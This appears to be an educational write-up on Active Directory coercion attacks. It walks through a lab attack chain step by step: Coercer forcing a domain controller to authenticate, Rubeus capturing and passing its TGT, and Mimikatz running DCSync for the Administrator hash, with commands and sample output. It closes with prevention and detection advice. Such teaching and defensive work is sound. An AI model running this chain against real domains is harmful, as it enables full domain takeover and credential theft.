## Description
Coercing attacks have emerged as a reliable way to escalate privileges from any user to Domain Administrator. In a typical Active Directory (AD) environment, nearly every setup is vulnerable to such attacks. The PrinterBug exemplifies coercion, but several other RPC functions can achieve similar results, enabling any domain user to coerce a RemoteServer$ to authenticate to any domain machine. The **Coercer** tool was developed to exploit multiple vulnerable RPC functions.

### Impact
Once coercion is established, the attacker can select from several "follow-up" attack methods:
- **Relay to another Domain Controller (DC)** and perform DCSync if SMB Signing is disabled.
- **Force the DC to connect to an Unconstrained Delegation (UD) machine**, capturing the TGT in the UD server’s memory (tools: Rubeus, Mimikatz).
- **Relay to Active Directory Certificate Services**, allowing threat agents to obtain and use a DC certificate (e.g., for DCSync).
- **Resource-Based Kerberos Delegation** for the relayed machine, enabling attackers to authenticate as any Administrator on that machine.

## Attack Methodology
For this scenario, we’ll capture a TGT on a compromised server configured for Unconstrained Delegation, using the **Coercer** tool.

### Step-by-Step Attack Execution

1. **Identify Unconstrained Delegation Servers** using PowerView:
    ```powershell
    Get-NetComputer -Unconstrained | select samaccountname
    ```
    Example Output:
    ```
    samaccountname
    --------------
    DC1$
    SERVER01$
    WS001$
    DC2$
    ```

2. **Run Rubeus** on the compromised host (e.g., WS001) to monitor for new logons:
    ```powershell
    .\Rubeus.exe monitor /interval:1
    ```
    Sample Output:
    ```
    [*] 18/12/2022 22.37.09 UTC - Found new TGT:
      User                  :  bob@EAGLE.LOCAL
      StartTime             :  18/12/2022 23.30.09
      ...
    ```

3. **Run Coercer** on the Kali machine to trigger authentication requests towards the UD machine:
    ```bash
    Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
    ```
    Example Output:
    ```
    [>] Pipe '\PIPE\lsarpc' is accessible!
      ...
    [>] Pipe '\PIPE\spoolss' is accessible!
      ...
    [+] All done!
    ```

4. **Capture the DC TGT** on WS001 using Rubeus:
    ```powershell
    [*] 18/12/2022 22.55.52 UTC - Found new TGT:
      User                  :  DC1$@EAGLE.LOCAL
      StartTime             :  18/12/2022 23.30.21
      ...
    ```

5. **Use the TGT for Domain Authentication**. One option is to load the TGT in Rubeus:
    ```powershell
    .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
    ```

6. **Perform a DCSync Attack** with Mimikatz to obtain the Administrator’s hash:
    ```powershell
    .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
    ```

## Prevention
Windows lacks built-in capabilities to monitor and control RPC calls to mitigate this attack. Two general prevention approaches:
- **Third-Party RPC Firewall**: Tools like Zero Networks’ RPC firewall can audit and block dangerous RPC functions, with an option to customize blocking for new OPNUMs.
- **Restrict Outbound Traffic on Ports 139 and 445**: Block these ports on Domain Controllers and other infrastructure servers except where necessary for AD functions. This can prevent not only known coercing attacks but also newly discovered vulnerabilities.

## Detection
Detecting RPC activity abuse is challenging without third-party tools. Zero Networks' RPC firewall provides comprehensive detection capabilities. Alternatively, monitoring firewall logs can help identify unusual patterns.

1. **Firewall Log Analysis**: Successful coercing attacks result in outbound traffic to the attacker machine, often on port 445.
2. **Traffic Blocking Detection**: Blocking outbound traffic on ports 139 and 445 prevents attackers from receiving coerced TGTs, and blocked connections serve as indicators of suspicious activity.

By monitoring for dropped traffic to ports 139 and 445, especially from critical infrastructure, unusual or unexpected traffic patterns can signal potential coercing attacks.

---
**Note**: Implementing both RPC firewalling and port restriction improves defenses against coercing attacks significantly.
